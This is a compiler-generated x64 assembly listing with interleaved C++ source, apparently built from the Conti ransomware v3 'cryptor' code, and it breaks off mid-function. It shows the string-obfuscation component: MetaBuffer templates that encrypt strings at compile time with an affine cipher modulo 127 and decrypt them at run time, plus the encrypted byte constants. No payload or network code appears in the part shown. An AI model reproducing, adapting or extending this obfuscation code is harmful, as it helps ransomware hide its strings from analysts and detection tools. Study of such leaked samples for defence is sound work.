; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 39	 mov	 BYTE PTR [rcx+1], 57	; 00000039H
  00007	c6 41 02 78	 mov	 BYTE PTR [rcx+2], 120	; 00000078H
  0000b	c6 41 03 6a	 mov	 BYTE PTR [rcx+3], 106	; 0000006aH
  0000f	c6 41 04 78	 mov	 BYTE PTR [rcx+4], 120	; 00000078H
  00013	c6 41 05 0c	 mov	 BYTE PTR [rcx+5], 12
  00017	c6 41 06 78	 mov	 BYTE PTR [rcx+6], 120	; 00000078H
  0001b	c6 41 07 5f	 mov	 BYTE PTR [rcx+7], 95	; 0000005fH
  0001f	c6 41 08 78	 mov	 BYTE PTR [rcx+8], 120	; 00000078H
  00023	c6 41 09 78	 mov	 BYTE PTR [rcx+9], 120	; 00000078H
  00027	c6 41 0a 78	 mov	 BYTE PTR [rcx+10], 120	; 00000078H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 0d 00 00 00	 mov	 eax, 13
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 69	 mov	 BYTE PTR [rcx+1], 105	; 00000069H
  00007	c6 41 02 0d	 mov	 BYTE PTR [rcx+2], 13
  0000b	c6 41 03 68	 mov	 BYTE PTR [rcx+3], 104	; 00000068H
  0000f	c6 41 04 0d	 mov	 BYTE PTR [rcx+4], 13
  00013	c6 41 05 50	 mov	 BYTE PTR [rcx+5], 80	; 00000050H
  00017	c6 41 06 0d	 mov	 BYTE PTR [rcx+6], 13
  0001b	c6 41 07 5a	 mov	 BYTE PTR [rcx+7], 90	; 0000005aH
  0001f	c6 41 08 0d	 mov	 BYTE PTR [rcx+8], 13
  00023	c6 41 09 0d	 mov	 BYTE PTR [rcx+9], 13
  00027	c6 41 0a 0d	 mov	 BYTE PTR [rcx+10], 13
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 66 00 00 00	 mov	 eax, 102		; 00000066H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 30	 mov	 BYTE PTR [rcx+1], 48	; 00000030H
  00007	c6 41 02 66	 mov	 BYTE PTR [rcx+2], 102	; 00000066H
  0000b	c6 41 03 2f	 mov	 BYTE PTR [rcx+3], 47	; 0000002fH
  0000f	c6 41 04 66	 mov	 BYTE PTR [rcx+4], 102	; 00000066H
  00013	c6 41 05 0c	 mov	 BYTE PTR [rcx+5], 12
  00017	c6 41 06 66	 mov	 BYTE PTR [rcx+6], 102	; 00000066H
  0001b	c6 41 07 37	 mov	 BYTE PTR [rcx+7], 55	; 00000037H
  0001f	c6 41 08 66	 mov	 BYTE PTR [rcx+8], 102	; 00000066H
  00023	c6 41 09 66	 mov	 BYTE PTR [rcx+9], 102	; 00000066H
  00027	c6 41 0a 66	 mov	 BYTE PTR [rcx+10], 102	; 00000066H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 5d	 sub	 ecx, 93			; 0000005dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6e	 mov	 BYTE PTR [rcx+1], 110	; 0000006eH
  00007	c6 41 02 5d	 mov	 BYTE PTR [rcx+2], 93	; 0000005dH
  0000b	c6 41 03 1c	 mov	 BYTE PTR [rcx+3], 28
  0000f	c6 41 04 5d	 mov	 BYTE PTR [rcx+4], 93	; 0000005dH
  00013	c6 41 05 33	 mov	 BYTE PTR [rcx+5], 51	; 00000033H
  00017	c6 41 06 5d	 mov	 BYTE PTR [rcx+6], 93	; 0000005dH
  0001b	c6 41 07 2c	 mov	 BYTE PTR [rcx+7], 44	; 0000002cH
  0001f	c6 41 08 5d	 mov	 BYTE PTR [rcx+8], 93	; 0000005dH
  00023	c6 41 09 5d	 mov	 BYTE PTR [rcx+9], 93	; 0000005dH
  00027	c6 41 0a 5d	 mov	 BYTE PTR [rcx+10], 93	; 0000005dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 46	 sub	 ecx, 70			; 00000046H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 27	 mov	 BYTE PTR [rcx+1], 39	; 00000027H
  00007	c6 41 02 46	 mov	 BYTE PTR [rcx+2], 70	; 00000046H
  0000b	c6 41 03 59	 mov	 BYTE PTR [rcx+3], 89	; 00000059H
  0000f	c6 41 04 46	 mov	 BYTE PTR [rcx+4], 70	; 00000046H
  00013	c6 41 05 52	 mov	 BYTE PTR [rcx+5], 82	; 00000052H
  00017	c6 41 06 46	 mov	 BYTE PTR [rcx+6], 70	; 00000046H
  0001b	c6 41 07 53	 mov	 BYTE PTR [rcx+7], 83	; 00000053H
  0001f	c6 41 08 46	 mov	 BYTE PTR [rcx+8], 70	; 00000046H
  00023	c6 41 09 02	 mov	 BYTE PTR [rcx+9], 2
  00027	c6 41 0a 46	 mov	 BYTE PTR [rcx+10], 70	; 00000046H
  0002b	c6 41 0b 38	 mov	 BYTE PTR [rcx+11], 56	; 00000038H
  0002f	c6 41 0c 46	 mov	 BYTE PTR [rcx+12], 70	; 00000046H
  00033	c6 41 0d 46	 mov	 BYTE PTR [rcx+13], 70	; 00000046H
  00037	c6 41 0e 46	 mov	 BYTE PTR [rcx+14], 70	; 00000046H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 75	 sub	 ecx, 117		; 00000075H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

